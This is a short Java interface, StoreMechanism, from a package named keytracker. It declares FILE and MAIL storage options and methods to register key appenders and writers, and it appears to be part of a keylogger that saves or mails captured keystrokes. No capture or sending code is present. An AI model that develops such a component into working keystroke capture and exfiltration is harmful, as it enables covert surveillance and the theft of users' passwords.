package com.keytracker;

import com.keytracker.file.Writer;

public interface StoreMechanism {

    enum Store {
        FILE, MAIL
    }

    void store();

    void registerAppender(KeyAppender keyAppender);

    void registerWriter(Writer writer);
}
